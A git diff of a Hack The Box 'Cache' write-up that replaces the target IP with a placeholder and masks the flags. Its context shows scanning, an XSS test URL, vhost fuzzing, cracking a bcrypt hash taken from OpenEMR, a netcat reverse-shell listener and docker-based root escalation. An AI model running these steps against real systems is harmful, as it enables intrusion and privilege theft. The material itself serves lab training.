@@ -11,8 +11,6 @@ htb_url: https://app.hackthebox.com/machines/Cache
 ---
 ## Overview
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/0-cache-infocard.png)
-
 Short description to include any strange things to be dealt with
 
 ## Useful Skills and Tools
@@ -30,9 +28,9 @@ Short description to include any strange things to be dealt with
 ### Nmap scan
 
 ```text
-zweilos@kali:~/htb/cache$ nmap -p- -sC -sV -oN cache.nmap 10.10.10.188
+zweilos@kali:~/htb/cache$ nmap -p- -sC -sV -oN cache.nmap <YOUR_IP>
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-09 11:32 EDT
-Nmap scan report for 10.10.10.188
+Nmap scan report for <YOUR_IP>
 Host is up (0.053s latency).
 Not shown: 65533 closed ports
 PORT   STATE SERVICE VERSION
@@ -50,13 +48,13 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 35.10 seconds
 ```
 
-I started my enumeration with an nmap scan of `10.10.10.188`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output with a filename of `<name>`.
+I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output with a filename of `<name>`.
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-cache.htb.png)
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2.5-author-john.png)
 
-[http://10.10.10.188/contactus.html?firstname=test&lastname=test&country=australia&subject=%3Cscript%3Ealert%28%22test%22%29%3C%2Fscript%3E\#](http://10.10.10.188/contactus.html?firstname=test&lastname=test&country=australia&subject=%3Cscript%3Ealert%28%22test%22%29%3C%2Fscript%3E#)
+[http://<YOUR_IP>/contactus.html?firstname=test&lastname=test&country=australia&subject=%3Cscript%3Ealert%28%22test%22%29%3C%2Fscript%3E\#](http://<YOUR_IP>/contactus.html?firstname=test&lastname=test&country=australia&subject=%3Cscript%3Ealert%28%22test%22%29%3C%2Fscript%3E#)
 
 message submission results in url
 
@@ -65,8 +63,8 @@ message submission results in url
 ```text
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
-+ Target IP:          10.10.10.188
-+ Target Hostname:    10.10.10.188
++ Target IP:          <YOUR_IP>
++ Target Hostname:    <YOUR_IP>
 + Target Port:        80
 + Start Time:         2020-08-09 11:33:04 (GMT-4)
 ---------------------------------------------------------------------------
@@ -120,7 +118,6 @@ body  {
 <center>
     <h1> Welcome Back!</h1>
     <img src="https://raw.githubusercontent.com/zweilosec/htb-writeups/master/4202252.jpg">
-
 
 <h1>This page is still underconstruction</h1>
 </center>
@@ -228,7 +225,7 @@ Found: *.cache.htb (Status: 400) [Size: 422]
 All of these 400 errors were somewhat promising since those sites seem to exist but my requests to them aren't correct.
 
 ```text
-zweilos@kali:~/htb/cache$ wfuzz --hh 8193 -w /home/zweilos/htb/cache/cache.cewl -H "Host: FUZZ.htb" http://10.10.10.188
+zweilos@kali:~/htb/cache$ wfuzz --hh 8193 -w /home/zweilos/htb/cache/cache.cewl -H "Host: FUZZ.htb" http://<YOUR_IP>
 
 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 
@@ -236,7 +233,7 @@ Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly 
 * Wfuzz 2.4.5 - The Web Fuzzer                         *
 ********************************************************
 
-Target: http://10.10.10.188/
+Target: http://<YOUR_IP>/
 Total requests: 1219
 
 ===================================================================
@@ -281,15 +278,11 @@ There is also a vulnerability report that I found that deals with this specific 
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/7-hms-public.png)
 
-
-
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/11-setup.png)
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/14-register.png)
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/15-messaging.png)
-
-
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/16-secure-chat.png)
 
@@ -574,7 +567,7 @@ Table: users_secure
 The table contained information about a `openemr_admin` user, including a bcrypt hashed password. I loaded the hash into hashcat and it cracked almost imediately.
 
 ```text
-zweilos@kali:~/htb/cache/results/10.10.10.188/scans$ hashcat -m 3200 -a 0 '$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.' /home/zweilos/rockyou_utf8.txt 
+zweilos@kali:~/htb/cache/results/<YOUR_IP>/scans$ hashcat -m 3200 -a 0 '$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.' /home/zweilos/rockyou_utf8.txt 
 hashcat (v6.0.0) starting...
 
 Hashes: 1 digests; 1 unique digests, 1 unique salts
@@ -845,9 +838,9 @@ zweilos@kali:~/htb/cache$ python3 ./exploit.py
 then in my other terminal
 
 ```text
-zweilos@kali:~/htb/cache/results/10.10.10.188/scans$ nc -lvnp 12346
+zweilos@kali:~/htb/cache/results/<YOUR_IP>/scans$ nc -lvnp 12346
 listening on [any] 12346 ...
-connect to [10.10.15.57] from (UNKNOWN) [10.10.10.188] 34384
+connect to [10.10.15.57] from (UNKNOWN) [<YOUR_IP>] 34384
 Linux cache 4.15.0-109-generic #110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
  15:10:25 up  2:09,  0 users,  load average: 0.00, 0.00, 0.00
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
@@ -861,8 +854,8 @@ $ which python3
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'
 www-data@cache:/$ ^Z
 [1]+  Stopped                 nc -lvnp 12346
-zweilos@kali:~/htb/cache/results/10.10.10.188/scans$ stty raw -echo
-zweilos@kali:~/htb/cache/results/10.10.10.188/scans$ nc -lvnp 12346
+zweilos@kali:~/htb/cache/results/<YOUR_IP>/scans$ stty raw -echo
+zweilos@kali:~/htb/cache/results/<YOUR_IP>/scans$ nc -lvnp 12346
 
 www-data@cache:/$ export TERM=xterm-256color
 www-data@cache:/$ clear
@@ -886,7 +879,7 @@ ash@cache:/dev/shm$
 
 ```text
 ash@cache:/dev/shm$ cat ~/user.txt
-d12352c0b83c09a8a46159db535b2776
+****
 ```
 
 ## Path to Power \(Gaining Administrator Access\)
@@ -951,7 +944,7 @@ ash@cache:/dev/shm$ ip a
        valid_lft forever preferred_lft forever
 2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
     link/ether 00:50:56:b9:7e:cb brd ff:ff:ff:ff:ff:ff
-    inet 10.10.10.188/24 brd 10.10.10.255 scope global ens160
+    inet <YOUR_IP>/24 brd <YOUR_IP> scope global ens160
        valid_lft forever preferred_lft forever
     inet6 dead:beef::250:56ff:feb9:7ecb/64 scope global dynamic mngtmpaddr noprefixroute 
        valid_lft 86387sec preferred_lft 14387sec
@@ -1171,9 +1164,5 @@ luffy@cache:~$ docker run -v /:/mnt --rm -it --privileged 2ca708c1c9cc chroot /m
 uid=0(root) gid=0(root) groups=0(root)
 5cbf7e7969b8
 # cat /root/root.txt
-90c1e62acc4d72f51790c2b63cc5c458
+****
 ```
-
-Thanks to [`<box_creator>`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for something interesting or useful about this machine.
-
-If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
